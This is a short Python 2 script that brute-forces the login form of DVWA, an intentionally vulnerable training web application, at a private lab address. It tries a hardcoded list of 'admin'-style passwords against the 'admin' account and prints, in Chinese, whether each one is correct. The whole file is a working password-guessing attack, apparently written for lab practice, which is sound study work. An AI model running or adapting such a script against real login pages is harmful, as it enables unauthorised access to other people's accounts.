import requests
passwords=['admin1','admin2','admin3','admin5','admin6','admin8','admin9','admin','admin10']

for password in passwords: 
    url='http://192.168.25.216/dvwa/vulnerabilities/brute/'
    payload={'username':'admin','password': password,'Login':'Login'}
    r=requests.get(url,params=payload)
    print r.text
    if 'Username and/or password incorrect' in r.content:
        print password,"不正确"
    else:
        print password,"正确"
